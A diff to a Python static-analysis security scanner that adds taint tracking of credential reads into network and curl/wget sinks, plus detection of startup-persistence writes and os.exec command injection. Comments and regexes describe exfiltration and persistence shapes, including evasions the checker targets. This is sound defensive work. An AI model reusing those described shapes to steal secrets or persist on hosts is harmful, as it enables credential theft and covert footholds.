+    _pstack = [(tree, None)]
+    while _pstack:
+        _pn, _pf = _pstack.pop()
+        for _ch in ast.iter_child_nodes(_pn):
+            if isinstance(_ch, (ast.FunctionDef, ast.AsyncFunctionDef)):
+                parent_fn[_ch] = _pf
+                _pstack.append((_ch, _ch))
+            else:
+                _pstack.append((_ch, _pf))
+    _lit_owner: list = []
+    _ob_cache: dict = {}
+
+    def _lit_assigns(body, m):
+        for n in _xf_scope_nodes(body):
+            if (
+                isinstance(n, ast.Assign)
+                and len(n.targets) == 1
+                and isinstance(n.targets[0], ast.Name)
+                and n.targets[0].id in m
+                and isinstance(n.value, ast.Constant)
+                and isinstance(n.value.value, str)
+            ):
+                yield n
+
+    def lit_owner():
+        """name -> the scope node (module tree / def node) holding its unique literal assign."""
+        if not _lit_owner:
+            m = get_str_map()
+            own: dict = {}
+            for a in _lit_assigns(getattr(tree, "body", []), m):
+                own[a.targets[0].id] = tree
+            for dd in defs:
+                for a in _lit_assigns(dd.node.body, m):
+                    own[a.targets[0].id] = dd.node
+            _lit_owner.append(own)
+        return _lit_owner[0]
+
+    def other_bound(snode):
+        """Names *snode* binds by anything OTHER than a candidate `NAME = "literal"` assign
+        (those are neutralised for the walk, then restored)."""
+        if snode not in _ob_cache:
+            m = get_str_map()
+            body = snode.body
+            swapped = [(a, a.targets) for a in _lit_assigns(body, m)]
+            try:
+                for a, _t in swapped:
+                    a.targets = [ast.Name(id="\x00", ctx=ast.Store())]
+                _ob_cache[snode] = _own_bound_names(snode) | _xf_extra_bound(body)
+            finally:
+                for a, t in swapped:
+                    a.targets = t
+        return _ob_cache[snode]
+
+    _ns_state: list = []
+
+    def str_resolves(d, nm):
+        # B-1086: a rebinding from a scope OFF the lexical chain (a sibling's `global NAME`,
+        # a nested function's `nonlocal NAME`) or by a dynamic namespace write is invisible to
+        # the chain walk below, so it fails closed -- no exemption.
+        if not _ns_state:
+            _ns_state.append((_xf_decl_rebound_names(tree), _xf_has_dynamic_ns_write(tree)))
+        decl_rebound, dyn_write = _ns_state[0]
+        if dyn_write or nm in decl_rebound:
+            return False
+        owner = lit_owner().get(nm)
+        if owner is None:
+            return False
+        sn = d.node if d is not None else None
+        while sn is not None:
+            if sn is owner:
+                return nm not in other_bound(sn)
+            if nm in other_bound(sn):
+                return False
+            sn = parent_fn.get(sn)
+        return owner is tree and nm not in other_bound(tree)
+
+    def scope_str_map(d, call):
+        """The string map as seen at *call* inside function *d* (None = module scope):
+        only the names the call mentions, only those `str_resolves`."""
+        m = get_str_map()
+        return {nm: m[nm] for nm in _names_in(call) if nm in m and str_resolves(d, nm)}
+
+    tops = [n for n in getattr(tree, "body", [])]
+    mod = _XfScope(tops, [], None)
+    scopes = [(None, mod)]
+    for d in defs:
+        scopes.append((d, _XfScope(d.node.body, d.params, d.cls)))
+
+    # ---- per-scope origin propagation -------------------------------------------------
+    def classify_value(v, scope_cls):
+        seeds = set()
+        c = _xf_cred_class(v, ctx)
+        if c == "other":
+            seeds.add("#")
+        elif c == "incluster":
+            seeds.add("I")
+        for sub in ast.walk(v):
+            if isinstance(sub, ast.Call):
+                for k in resolve(sub, scope_cls):
+                    seeds.add(f"f:{k}")
+        return seeds
+
+    def propagate(scope, base, attr_base=None):
+        tainted: dict = {}
+        queue: list = []
+        pairs = 0
+        overflow = False
+
+        def add(name, origs):
+            nonlocal pairs, overflow
+            cur = tainted.setdefault(name, set())
+            new = origs - cur
+            if new:
+                pairs += len(new)
+                if pairs > _XF_MAX_PAIRS:
+                    overflow = True
+                    return
+                cur |= new
+                queue.append((name, new))
+
+        uses: dict = {}
+        bound = set(scope.params)
+        for ts, v in scope.bindings:
+            bound.update(ts)
+        for bi, (ts, v) in enumerate(scope.bindings):
+            for nm in _xf_refs(v):
+                uses.setdefault(nm, []).append(bi)
+        for nm, o in base.items():
+            if nm not in bound:
+                add(nm, set(o))
+        for nm, o in (attr_base or {}).items():
+            add(nm, set(o))
+        for p in scope.params:
+            add(p, {f"p:{p}"})
+        # B-1083: `seeded` = this scope can hold a credential at all. A handoff slot
+        # (attr_base) is one; so is a direct '#'/'I' read; a helper-call origin ("f:k") is
+        # one only once `k` resolves as cred-returning (impure_f / incl_f, known after this
+        # pass), so the call indices are recorded in `seed_fs` for `maybe_cred`.
+        scope.seeded = bool(attr_base)
+        scope.seed_fs = set()
+        for ts, v in scope.bindings:
+            seeds = classify_value(v, scope.cls)
+            if seeds & {"#", "I"}:
+                scope.seeded = True
+            scope.seed_fs.update(int(x[2:]) for x in seeds if x.startswith("f:"))
+            if seeds:
+                for t in ts:
+                    add(t, seeds)
+        while queue and not overflow:
+            name, new = queue.pop()
+            for bi in uses.get(name, ()):
+                for t in scope.bindings[bi][0]:
+                    add(t, new)
+        scope.tainted = tainted
+        scope.overflow = overflow
+        return tainted
+
+    def strip(t):
+        return {
+            k: {o for o in v if not o.startswith("p:")}
+            for k, v in t.items()
+            if not k.startswith("@")
+        }
+
+    def with_overflow(b):
+        # fail closed: a module scope whose pair budget ran out has unknown taint, so
+        # every module-level name is treated as a credential read
+        if mod.overflow:
+            for nm in mod_names:
+                b.setdefault(nm, set()).add("#")
+        return b
+
+    mod_names = set()
+    mod_t = propagate(mod, {})
+    for ts, _v in mod.bindings:
+        mod_names.update(t for t in ts if not t.startswith("@"))
+    base = with_overflow(strip(mod_t))
+    for d, sc in scopes[1:]:
+        propagate(sc, base)
+    # Handoff slots, with ONE extra round (a slot filled by code that only reads another
+    # slot is the declared ceiling): `self.x = <cred>` in one method and read in another,
+    # and a module-level dict/list a function stores into (`S["k"] = <cred>`) that another
+    # function (or the module body) sends.
+    cslots: dict = {}
+    mslots: dict = {}
+    mod_bound = set()
+    for ts, _v in mod.bindings:
+        mod_bound.update(ts)
+    for d, sc in scopes[1:]:
+        for k, o in sc.tainted.items():
+            real = {x for x in o if not x.startswith("p:")}
+            if not real:
+                continue
+            if k.startswith("@") and d.cls is not None:
+                cslots.setdefault(id(d.cls), {}).setdefault(k, set()).update(real)
+            elif (
+                k in sc.stored
+                and k not in sc.plain
+                and k not in sc.params
+                and k in mod_bound
+            ):
+                mslots.setdefault(k, set()).update(real)
+    if cslots or mslots:
+        if mslots:
+            mod_t = propagate(mod, {}, mslots)
+        base = with_overflow(strip(mod_t))
+        for k, o in mslots.items():
+            base.setdefault(k, set()).update(o)
+        for d, sc in scopes[1:]:
+            if mslots or (d.cls is not None and id(d.cls) in cslots):
+                propagate(sc, base, cslots.get(id(d.cls)) if d.cls is not None else None)
+
+    def origins_of(node, scope):
+        """Origins carried by *node*: tainted names, local-call results, inline reads."""
+        o: set = set()
+        for nm in _xf_refs(node):
+            t = scope.tainted.get(nm)
+            if t:
+                o |= t
+        for sub in ast.walk(node):
+            if isinstance(sub, ast.Call):
+                for k in resolve(sub, scope.cls):
+                    o.add(f"f:{k}")
+        if _xf_inline_cred_read(node, ctx):
+            o.add("#")
+        return o
+
+    # ---- cred-returning / in-cluster-returning functions (reverse BFS) ---------------
+    n = len(defs)
+    ret_o: list = [set() for _ in range(n)]
+    for d, sc in scopes[1:]:
+        o: set = set()
+        for r in sc.returns:
+            o |= origins_of(r, sc)
+        if sc.overflow:
+            o.add("#")
+        ret_o[d.idx] = o
+    callers: list = [[] for _ in range(n)]
+    for i in range(n):
+        for x in ret_o[i]:
+            if x.startswith("f:"):
+                callers[int(x[2:])].append(i)
+
+    def closure(seed_idx):
+        seen = set(seed_idx)
+        stack = list(seen)
+        while stack:
+            j = stack.pop()
+            for i in callers[j]:
+                if i not in seen:
+                    seen.add(i)
+                    stack.append(i)
+        return seen
+
+    impure_f = closure([i for i in range(n) if "#" in ret_o[i]])
+    incl_f = closure([i for i in range(n) if "I" in ret_o[i]]) - impure_f
+
+    def kind(origs):
+        """'impure' | 'incluster' | None for an origin set."""
+        if "#" in origs or any(
+            x.startswith("f:") and int(x[2:]) in impure_f for x in origs
+        ):
+            return "impure"
+        if "I" in origs or any(
+            x.startswith("f:") and int(x[2:]) in incl_f for x in origs
+        ):
+            return "incluster"
+        return None
+
+    def maybe_cred(sc):
+        """B-1083: True when an OVERFLOWED scope (incomplete taint map) may hold a credential:
+        a direct read, a handoff slot, a cred-returning helper call, or module-level taint.
+        A scope with none of these has nothing to lose, so it stays silent."""
+        return bool(
+            sc.seeded
+            or mod.overflow
+            or base
+            or any(k in impure_f or k in incl_f for k in sc.seed_fs)
+        )
+
+    # ---- sink params (reverse BFS over param -> param edges) -------------------------
+    sink_direct: set = set()
+    sink_nonexempt: set = set()
+    edges_in: dict = {}  # (j,q) -> list[(i,p)]  i.e. (i,p) feeds (j,q)
+    sink_calls: list = []  # (scope, call, is_net, is_curl)
+    for d, sc in scopes:
+        for call in sc.calls:
+            is_net = _is_net_sink(call.func, net_sink_aliases)
+            is_curl = _is_curl_wget_argv_call(call)
+            if is_net or is_curl:
+                sink_calls.append((d, sc, call, is_net))
+                if d is None:
+                    continue
+                o_call = origins_of(call, sc)
+                names = _names_in(call)
+                for p in d.params:
+                    tag = f"p:{p}"
+                    if tag not in o_call and not sc.overflow:
+                        continue
+                    sink_direct.add((d.idx, p))
+                    hit = {nm for nm in names if tag in sc.tainted.get(nm, ())}
+                    if not (is_net and hit and _is_incluster_auth_exempt(call, hit, scope_str_map(d, call))):
+                        sink_nonexempt.add((d.idx, p))
+            if d is not None:
+                for fn_expr, v_args, v_kws in _xf_call_views(call):
+                    for k in resolve_fn(fn_expr, sc.cls):
+                        for q, arg in _xf_arg_targets(defs[k], v_args, v_kws):
+                            for x in origins_of(arg, sc):
+                                if x.startswith("p:"):
+                                    edges_in.setdefault((k, q), []).append((d.idx, x[2:]))
+
+    def back_closure(seed):
+        seen = set(seed)
+        stack = list(seen)
+        while stack:
+            node = stack.pop()
+            for pred in edges_in.get(node, ()):
+                if pred not in seen:
+                    seen.add(pred)
+                    stack.append(pred)
+        return seen
+
+    sink_params = back_closure(sink_direct)
+    nonexempt = back_closure(sink_nonexempt)
+
+    # ---- convictions -----------------------------------------------------------------
+    out: list = []
+    seen_ln: set = set()
+    for d, sc, call, is_net in sink_calls:
+        o = origins_of(call, sc)
+        kd = kind(o)
+        if kd is None and sc.overflow and maybe_cred(sc):
+            # the scope's pair budget ran out: its taint map is incomplete, so a scope that
+            # reads a credential (directly, or through a cred-returning helper call) or sees
+            # module-level taint, and has a sink, is convicted
+            kd = "impure"
+        if kd is None:
+            continue
+        if kd == "incluster" and is_net:
+            hit = {nm for nm in _names_in(call) if "I" in sc.tainted.get(nm, ())}
+            if hit and _is_incluster_auth_exempt(call, hit, scope_str_map(d, call)):
+                continue
+        detail = (
+            "credential-file contents flow into a network sink (read secret -> send out)"
+            if is_net
+            else "credential-file contents flow into a curl/wget egress argv (read secret -> send out)"
+        )
+        ln = getattr(call, "lineno", 0)
+        if ln not in seen_ln:
+            seen_ln.add(ln)
+            out.append((ln, detail))
+    for d, sc in scopes:
+        for call in sc.calls:
+            for fn_expr, v_args, v_kws in _xf_call_views(call):
+                for k in resolve_fn(fn_expr, sc.cls):
+                    for q, arg in _xf_arg_targets(defs[k], v_args, v_kws):
+                        if (k, q) not in sink_params:
+                            continue
+                        kd = kind(origins_of(arg, sc))
+                        if kd is None and sc.overflow and maybe_cred(sc):
+                            kd = "impure"  # B-1083: same fail-closed fallback as above
+                        if kd is None or (kd == "incluster" and (k, q) not in nonexempt):
+                            continue
+                        ln = getattr(call, "lineno", 0)
+                        if ln not in seen_ln:
+                            seen_ln.add(ln)
+                            out.append(
+                                (
+                                    ln,
+                                    "credential-file contents flow into a network sink "
+                                    "(read secret -> send out)",
+                                )
+                            )
+    return out
 
 
 def _is_decode_call(node: ast.AST) -> bool:
@@ -12024,6 +14321,282 @@ def _persist_install_function_findings(tree: ast.AST) -> list[tuple[int, str, st
     return hits
 
 
+# -- B-1049: startup-persistence writes whose destination is ASSEMBLED in code ----------
+#
+# checks/_vet.py's `_CRON_PERSIST_RE` is a text regex over contiguous path text, so
+# `Path.home()/".config/systemd/user/x.service"` convicts B13 ("cron/startup
+# persistence") while the identical write spelled `u = Path.home()/".config"/"systemd"/
+# "user"; (u/"c.service").write_text(...)` -- the path never appears as one literal --
+# was vetted INSTALL. The argv-list `["systemctl","--user","enable",...]` is the same
+# gap on the verb side: the regex needs `systemctl ... enable` as contiguous text.
+#
+# This pass feeds the SAME verdict (same label, same discriminators, in
+# check_installed_skills): it resolves a write call's destination with the path-fold
+# algebra above (`_fold_seg`: pathlib `/`, `.joinpath`, os.path.join, `+`, one level of
+# single-binding name hop) and matches the folded text against `_PERSIST_FOLDED_PATH_RE`,
+# which is by construction the three bare-path alternatives of `_CRON_PERSIST_RE`
+# (tests/test_b1049_* pins the two patterns equal -- a broader set is not this rule's
+# call to make). Fail-closed in the only direction that matters here: an unresolved
+# segment folds to the _FOLD_UNK sentinel, which never completes a match, so an
+# unresolvable path simply adds no hit; nothing is ever cleared by this pass.
+#
+# Deliberate limits: a fold that goes through a name bound more than once, a function
+# parameter, or a non-path expression (a `%`/`.format` template) is unresolved, so a
+# destination built that way is still unseen (disclosed in the B-1049 test file).
+_PERSIST_FOLDED_PATH_RE = re.compile(
+    r"(?:/etc/cron\.(?:d|daily|weekly|monthly|hourly)"
+    r"|Library/LaunchAgents"
+    r"|\.config/systemd/user/\S+\.(?:service|timer)\b)",
+    re.I,
+)
+# Receiver-is-the-destination write methods (pathlib), and call names whose DESTINATION
+# is the second positional argument (shutil / os; the bare imported names too).
+_PERSIST_RECEIVER_WRITE_ATTRS = frozenset(
+    {"write_text", "write_bytes", "symlink_to", "hardlink_to", "touch"}
+)
+_PERSIST_DST_ARG1_NAMES = frozenset(
+    {"copy", "copy2", "copyfile", "copytree", "move", "rename", "symlink", "link"}
+)
+_PERSIST_ARGV_WRAPPERS = frozenset({"sudo", "doas", "pkexec"})
+_PERSIST_ARGV_MAX = 16  # elements read per argv literal
+_PERSIST_MAX_SITES = 8  # findings per file; analyze_python reserves exactly this many slots
+_PERSIST_OVERFLOW_TAG = " [overflow]"  # checks/_vet.py convicts on it without down-ranking
+
+
+def _persist_joined_text(node: ast.AST) -> "str | None":
+    """An f-string's text with each `{...}` hole as the _FOLD_UNK sentinel (so the
+    known `.service` tail of `f"{name}.service"` survives); None for any other node."""
+    if not isinstance(node, ast.JoinedStr):
+        return None
+    return "".join(
+        v.value if isinstance(v, ast.Constant) and isinstance(v.value, str) else _FOLD_UNK
+        for v in node.values
+    )
+
+
+def _persist_fold_dest(node: ast.AST, ctx: "_FsFoldCtx", _hop: int = 0) -> "str | None":
+    """The folded text of a write destination, or None. `_fold_seg` first; then the two
+    shapes it does not fold on purpose (it is shared with the credential-path fold, whose
+    verdicts must not move): an f-string as the LAST `/` component or `.joinpath` argument
+    (`u / f"{name}.service"`), and one name hop (`p = <that>; p.write_text(...)`)."""
+    got = _fold_seg(node, ctx, frozenset())
+    if got is not None and _PERSIST_FOLDED_PATH_RE.search(got):
+        return got
+    if isinstance(node, ast.Name) and _hop == 0 and node.id in ctx.single:
+        return _persist_fold_dest(ctx.single[node.id], ctx, 1)
+    head = last = None
+    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
+        last = node.right
+        head = _fold_seg(node.left, ctx, frozenset())
+    elif (
+        isinstance(node, ast.Call)
+        and isinstance(node.func, ast.Attribute)
+        and node.func.attr == "joinpath"
+        and node.args
+        and not node.keywords
+        and not any(isinstance(a, ast.Starred) for a in node.args)
+    ):
+        # No synthetic nodes: the fold memo is keyed on id(node), and a temporary node's
+        # id can be reused after it is freed.
+        last = node.args[-1]
+        head = _fold_seg(node.func.value, ctx, frozenset())
+        for a in node.args[:-1]:
+            seg = _fold_seg(a, ctx, frozenset())
+            head = _fold_pjoin(_FOLD_UNK if head is None else head, _FOLD_UNK if seg is None else seg)
+    tail = _persist_joined_text(last) if last is not None else None
+    if tail is None or head is None:
+        return got
+    joined = _fold_pjoin(head, tail)
+    return joined if _PERSIST_FOLDED_PATH_RE.search(joined) else got
+
+
+def _persist_open_writes(call: ast.Call, mode_idx: int) -> bool:
+    """True when an `open`-style call's mode argument (keyword `mode`, else position
+    *mode_idx*) writes. No mode is a read. A mode that is not a string literal is
+    treated as a write: the destination already folded to a persistence path, and a
+    skill that reads a unit file through a computed mode is far rarer than one hiding
+    the write in a variable."""
+    mode = None
+    for kw in call.keywords:
+        if kw.arg == "mode":
+            mode = kw.value
+    if mode is None and len(call.args) > mode_idx:
+        mode = call.args[mode_idx]
+    if mode is None:
+        return False
+    if isinstance(mode, ast.Constant) and isinstance(mode.value, str):
+        return any(c in mode.value for c in "wax+")
+    return True
+
+
+_PERSIST_SERVICE_NAME_RE = re.compile(r"[A-Za-z0-9_.@:-]+\Z")
+
+
+# Options these two verbs are known to take WITHOUT a value; anything else with a leading
+# "-" (an unknown flag, a `--flag=value`, an option whose value is the next token) cannot be
+# told apart from a service name, so it is rendered "?" instead of being dropped.
+_PERSIST_KNOWN_FLAGS = frozenset({
+    "--user", "--system", "--global", "--now", "--runtime", "--force", "-f", "--quiet",
+    "-q", "--no-block", "--no-reload", "--no-ask-password", "--no-pager", "--no-warn",
+    "--plain", "--full",
+    "-w", "-F",  # launchctl load
+})
+
+
+def _persist_service_tokens(vals: list, start: int, truncated: bool) -> "list[str]":
+    """Every token after the verb that could be a service, as a safe service name or "?".
+    An unresolved token (None), a name outside the plain unit-name alphabet, an unknown
+    "-"-prefixed token, and any tail this read did not cover are all "?": "?" never
+    matches the reputable-daemon set, so an unreadable argument can only keep a hit
+    convicting, never down-rank it. Only the known value-less options above are skipped;
+    after a literal `--` every later token is positional (and one with a leading "-" is
+    "?" too: a unit name never starts with one)."""
+    out = []
+    after_dd = False
+    for v in vals[start:]:
+        if v is None:
+            out.append("?")  # could be a flag or a service: count it as a service
+        elif not after_dd and v == "--":
+            after_dd = True
+        elif not after_dd and v in _PERSIST_KNOWN_FLAGS:
+            continue
+        elif v.startswith("-") or not _PERSIST_SERVICE_NAME_RE.match(v):
+            out.append("?")
+        else:
+            out.append(v)
+    if truncated:
+        out.append("?")
+    return out or ["?"]
+
+
+def _persist_argv_kind(node: ast.AST, ctx: "_FsFoldCtx") -> "tuple[str, list[str]] | None":
+    """`(program, service_tokens)` for an argv list/tuple literal `[systemctl, <--flags>,
+    enable, ...]` or `[launchctl, load, ...]` (optionally behind sudo/doas/pkexec) -- the
+    two verb-anchored alternatives of `_CRON_PERSIST_RE`, whose contiguous-text form
+    cannot match an argv split into separate string tokens. Elements are read only when
+    they are a string literal or a once-bound name; anything else is unknown (None)."""
+    if not isinstance(node, (ast.List, ast.Tuple)) or len(node.elts) < 2:
+        return None
+    vals: list = []
+    for e in node.elts[:_PERSIST_ARGV_MAX]:
+        if isinstance(e, (ast.Constant, ast.Name)):
+            v = _fold_seg(e, ctx, frozenset())
+        else:
+            v = None
+        vals.append(v)
+    cut = len(node.elts) > _PERSIST_ARGV_MAX
+    i = 0
+    while i < len(vals) and vals[i] in _PERSIST_ARGV_WRAPPERS:
+        i += 1
+    if i >= len(vals) or vals[i] is None:
+        return None
+    prog = vals[i].rsplit("/", 1)[-1].lower()
+    if prog == "systemctl":
+        j = i + 1
+        while j < len(vals) and vals[j] is not None and vals[j].startswith("-"):
+            j += 1
+        if j < len(vals) and vals[j] is not None and vals[j].lower() == "enable":
+            return "systemctl", _persist_service_tokens(vals, j + 1, cut)
+    elif prog == "launchctl":
+        if i + 1 < len(vals) and vals[i + 1] is not None and vals[i + 1].lower() == "load":
+            return "launchctl", _persist_service_tokens(vals, i + 2, cut)
+    return None
+
+
+def _startup_persistence_sites(
+    tree: ast.AST, ctx: "_FsFoldCtx"
+) -> "list[tuple[int, str, str]]":
+    """B-1049: `(lineno, rule, detail)` for every write whose destination folds to a
+    startup-persistence path, and every argv-list enable/load of a service. Read-only
+    and verdict-free; check_installed_skills owns what a site means."""
+    sites: list = []
+    enable_lines: dict = {}
+    enable_progs: dict = {}
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.List, ast.Tuple)):
+            kind = _persist_argv_kind(node, ctx)
+            if kind is not None:
+                prog, svcs = kind
+                ln = getattr(node, "lineno", 0)
+                # One finding per (rule, line) with EVERY service on that line: the
+                # engine's (rule, lineno) dedup would otherwise let a reputable enable
+                # on a line hide a covert one beside it.
+                enable_lines.setdefault(ln, []).extend(svcs)
+                enable_progs.setdefault(ln, prog)
+            continue
+        if not isinstance(node, ast.Call):
+            continue
+        f = node.func
+        cands: list = []  # destination nodes this call writes to
+        if isinstance(f, ast.Attribute):
+            if f.attr in _PERSIST_RECEIVER_WRITE_ATTRS:
+                cands.append(f.value)
+            elif f.attr == "open":
+                if _persist_open_writes(node, 0):
+                    cands.append(f.value)
+                if node.args and _persist_open_writes(node, 1):
+                    cands.append(node.args[0])
+            elif f.attr in ("rename", "replace") and len(node.args) == 1:
+                cands.append(node.args[0])  # Path.rename(target) / Path.replace(target)
+            elif f.attr in _PERSIST_DST_ARG1_NAMES or (
+                f.attr == "replace" and _attr_base(f.value) == "os"
+            ):
+                if len(node.args) >= 2:
+                    cands.append(node.args[1])
+        elif isinstance(f, ast.Name):
+            if f.id == "open" and node.args and _persist_open_writes(node, 1):
+                cands.append(node.args[0])
+            elif f.id in _PERSIST_DST_ARG1_NAMES and len(node.args) >= 2:
+                cands.append(node.args[1])
+        for kw in node.keywords:
+            if kw.arg == "dst" and (
+                (isinstance(f, ast.Attribute) and f.attr in _PERSIST_DST_ARG1_NAMES)
+                or (isinstance(f, ast.Name) and f.id in _PERSIST_DST_ARG1_NAMES)
+            ):
+                cands.append(kw.value)
+        for dest in cands:
+            folded = _persist_fold_dest(dest, ctx)
+            m = _PERSIST_FOLDED_PATH_RE.search(folded) if folded is not None else None
+            if m is not None:
+                where = m.group(0).lower()
+                what = (
+                    "a systemd user unit" if "systemd" in where
+                    else "a launchd launch agent" if "launchagents" in where
+                    else "a cron directory"
+                )
+                sites.append((
+                    getattr(node, "lineno", 0),
+                    "STARTUP_PERSISTENCE_WRITE",
+                    f"writes into {what} through a path assembled in code",
+                ))
+                break
+    for ln, svcs in enable_lines.items():
+        prog = enable_progs[ln]
+        verb = "enable" if prog == "systemctl" else "load"
+        sites.append((
+            ln,
+            "STARTUP_PERSISTENCE_ENABLE",
+            f"argv-list {prog} {verb} installs a boot-time service "
+            f"(service: {', '.join(sorted(set(svcs)))})",
+        ))
+    # Distinct (rule, line) groups only, in line order, bounded: analyze_python reserves
+    # this many slots out of the per-file cap (see there). Past the bound the last entry
+    # is replaced by an overflow marker that the verdict side always convicts on.
+    seen_keys = set()
+    uniq = []
+    for site in sorted(sites, key=lambda t: (t[0], t[1])):
+        if (site[0], site[1]) not in seen_keys:
+            seen_keys.add((site[0], site[1]))
+            uniq.append(site)
+    if len(uniq) > _PERSIST_MAX_SITES:
+        ln, rule, _ = uniq[_PERSIST_MAX_SITES - 1]
+        uniq = uniq[: _PERSIST_MAX_SITES - 1] + [(
+            ln, rule,
+            f"further startup-persistence sites in this file are not listed{_PERSIST_OVERFLOW_TAG}",
+        )]
+    return uniq
+
+
 # -- B-917: loader sinks (runpy/importlib/zipimport execute a FILE by
 # PATH, not a name reference) and staged-import correlation (a write followed by an
 # import whose search path resolves to the same location). Both reuse shippedexec's
@@ -13260,24 +15833,53 @@ def analyze_python(
             incluster_pure = _incluster_pure_tainted_names(tree, _fsctx)
             str_map = _simple_str_const_assigns(tree) if incluster_pure else {}
             for node in ast.walk(tree):
-                if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
+                if not isinstance(node, ast.Call):
+                    continue
+                is_net = _is_net_sink(node.func, net_sink_aliases)
+                # B-1059: a curl/wget argv-list subprocess call is an egress sink too --
+                # the credential never touches a Python net library, it is handed to curl
+                # (`subprocess.run(["curl","--data-binary",d,url])`, `-H`, `--url-query`...).
+                is_curl = _is_curl_wget_argv_call(node)
+                if not (is_net or is_curl):
                     continue
                 hit_names = _names_in(node) & cred_tainted
                 if not hit_names:
                     continue
-                # Exemption applies ONLY when every hit name is in-cluster-pure (never
-                # a name also/ever sourced from .ssh/.aws/a generic secrets mount) AND
-                # the position+destination checks in _is_incluster_auth_exempt hold.
-                if hit_names <= incluster_pure and _is_incluster_auth_exempt(
-                    node, hit_names, str_map
-                ):
-                    continue
+                if is_curl and not is_net:
+                    # a credential reaching a curl/wget call is exfil, fail-closed: NO
+                    # in-cluster carve-out here (see _is_curl_wget_argv_call's B-1059 note)
+                    # -- an SA token sent via curl to an attacker host is exfil, and a
+                    # sound "reaches only the cluster API" proof is a full argv parse this
+                    # does not attempt.
+                    _detail = (
+                        "credential-file contents flow into a curl/wget egress argv "
+                        "(read secret -> send out)"
+                    )
+                else:
+                    # Exemption applies ONLY when every hit name is in-cluster-pure (never
+                    # a name also/ever sourced from .ssh/.aws/a generic secrets mount) AND
+                    # the position+destination checks in _is_incluster_auth_exempt hold.
+                    if hit_names <= incluster_pure and _is_incluster_auth_exempt(
+                        node, hit_names, str_map
+                    ):
+                        continue
+                    _detail = (
+                        "credential-file contents flow into a network sink "
+                        "(read secret -> send out)"
+                    )
                 add(
                     "CRED_EXFIL_FLOW",
                     "crit",
                     getattr(node, "lineno", 0),
-                    "credential-file contents flow into a network sink (read secret -> send out)",
+                    _detail,
                 )
+
+        # B-1047: the flow the name-based pass above cannot see -- the credential read
+        # and the network send split across local functions (return -> argument), and
+        # the loop / with / container bindings that pass never modelled. Scoped and
+        # linear; see the block comment above `_xf_cred_flow_findings`.
+        for _xf_ln, _xf_detail in _xf_cred_flow_findings(tree, _fsctx, net_sink_aliases):
+            add("CRED_EXFIL_FLOW", "crit", _xf_ln, _xf_detail)
 
     # B-830 round-4: ctx.truncated (see _FsFoldCtx.__init__) counts how many fold calls
     # hit _FOLD_MAX_DEPTH and gave up on their own subtree -- round-3 added the counter
@@ -13620,7 +16222,7 @@ def analyze_python(
     # `subprocess.check_call([os.environ["P"], "x"])`, no bound Name anywhere) still
     # enters the pass below instead of being skipped outright at this gate.
     _has_inline_exec_sink_source = any(
-        _is_exec_sink_call(n.func)[0]
+        (_is_exec_sink_call(n.func)[0] or _os_exec_spawn_parts(n) is not None)
         and any(
             _value_is_tainted_source(a, set(), tree) or ref_res.source_in(a)
             for a in list(n.args) + [kw.value for kw in n.keywords]
@@ -13683,9 +16285,28 @@ def analyze_python(
                 any_t, direct = _call_args_tainted_for_exec_sink(
                     node, ext_visible, ref_res=ref_res, tree=tree
                 )
+                # B-1022: taint that reaches the argv list only through a later
+                # `.append()`/`.extend()` on its bound Name. Such a call has no tainted
+                # NAME in its own arguments, so the artifact-read exemptions below (which
+                # reason over the call's own arguments) must not run for it.
+                mut_taint = False
+                if (
+                    not any_t
+                    and exec_name.startswith("subprocess.")
+                    and _b1022_mutated_argv_taint(
+                        node,
+                        owner_map.get(node)
+                        if isinstance(owner_map.get(node), (ast.FunctionDef, ast.AsyncFunctionDef))
+                        else tree,
+                        ext_visible,
+                        ref_res,
+                        tree,
+                    )
+                ):
+                    any_t, direct, mut_taint = True, False, True
                 # B-638: the tainted input is exactly the read of a file this artifact
                 # ships (see the OBFUSCATED_EXEC site above).
-                if any_t and shipped_exec is not None and (
+                if any_t and not mut_taint and shipped_exec is not None and (
                     (ln, node.col_offset) in shipped_exec or (ln, node.col_offset) in unshipped_exec
                 ):
                     continue
@@ -13715,7 +16336,7 @@ def analyze_python(
                     # waved through -- the exact B-916 failure this site already
                     # documents, for the new resolver instead of the old one.
                     _all_args = list(node.args) + [kw.value for kw in node.keywords]
-                    if shipped_exec is None and _all_args and all(
+                    if not mut_taint and shipped_exec is None and _all_args and all(
                         (
                             not (_names_in(_a) & ext_visible)
                             and not _value_is_tainted_source(_a, ext_visible, tree)
@@ -13781,6 +16402,39 @@ def analyze_python(
                         f"external input flows into {exec_name} ({flow_kind} flow) \u2014 command/code injection",
                     )
                     continue
+
+            # B-1024: os.exec*/os.spawn* -- program is a separate argument, argv a list.
+            os_parts = _os_exec_spawn_parts(node)
+            if os_parts is not None:
+                ext_visible = _tainted_names_visible(
+                    node, ext_taint_map, owner_map, parent_scope, shadow_cache
+                )
+                _own = owner_map.get(node)
+                verdict = _os_exec_spawn_verdict(
+                    node,
+                    os_parts,
+                    ext_visible,
+                    list_bindings_by_call.get(node),
+                    _own if isinstance(_own, (ast.FunctionDef, ast.AsyncFunctionDef)) else tree,
+                    ref_res,
+                    tree,
+                )
+                if verdict == "crit":
+                    add(
+                        "TT5_CMD_INJECTION",
+                        "crit",
+                        ln,
+                        f"external input flows into {os_parts[0]} \u2014 command/code injection",
+                    )
+                elif verdict == "info":
+                    add(
+                        "TT5_ARG_INJECTION",
+                        "info",
+                        ln,
+                        f"external input flows into {os_parts[0]} as a non-program list argument "
+                        "\u2014 argument injection, not command injection",
+                    )
+                continue
 
             # TT4: file-read tainted value flows into a data-bearing network sink.
             is_net_data, net_name = _is_net_out_data_sink(node.func)
@@ -14024,8 +16678,21 @@ def analyze_python(
                 "install (mechanism B)",
             )
 
-    if len(out) <= _MAX_FINDINGS_PER_FILE:
-        return out
+    # B-1049: startup-persistence writes / argv-list service enables whose destination or
+    # verb is assembled in code -- see the module comment above `_PERSIST_FOLDED_PATH_RE`.
+    # "info": the verdict (and every discriminator the regex route already has) lives in
+    # checks/_vet.py's B13 loop, keyed on these two rule names. Kept OUT of `out` until
+    # after the per-file cap: the cap sorts by severity, and an "info" verdict carrier
+    # would otherwise be evictable by padding the file with other info findings. At most
+    # _PERSIST_MAX_SITES of them exist (the last one an overflow marker), and exactly that
+    # many slots are reserved below.
+    persist_out = [
+        ASTFinding(_sp_rule, "info", _sp_ln, _sp_detail)
+        for _sp_ln, _sp_rule, _sp_detail in _startup_persistence_sites(tree, _fsctx)
+    ]
+
